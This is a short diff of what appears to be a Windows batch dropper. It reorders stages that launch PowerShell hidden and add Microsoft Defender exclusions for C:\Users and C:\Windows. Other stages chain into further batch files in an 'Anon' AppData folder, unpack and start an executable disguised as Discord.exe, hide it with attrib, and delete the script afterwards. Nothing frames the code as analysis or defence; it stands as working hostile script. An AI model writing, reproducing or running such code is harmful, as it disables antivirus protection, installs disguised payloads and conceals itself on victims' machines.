@@ -36,19 +36,6 @@ start C:\Users\%USERNAME%\AppData\Local\Anon\1.bat"
 
 del "%~f0" & exit
 
-:---------------------------------------------------------------------------------------------------------------------------:
-
-
-@echo off
-
-powershell -window hidden -command ""
-
-powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users
-powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Windows
-
-start C:\Users\%USERNAME%\AppData\Local\Anon\2.bat"
-
-del "%~f0" & exit
 
 :---------------------------------------------------------------------------------------------------------------------------:
 
@@ -62,6 +49,21 @@ tar -xf Discord.zip
 del Discord.zip
 start Discord.exe
 attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Discord.exe" /s /d
+
+del "%~f0" & exit
+
+
+:---------------------------------------------------------------------------------------------------------------------------:
+
+
+@echo off
+
+powershell -window hidden -command ""
+
+powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users
+powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Windows
+
+start C:\Users\%USERNAME%\AppData\Local\Anon\2.bat"
 
 del "%~f0" & exit
 
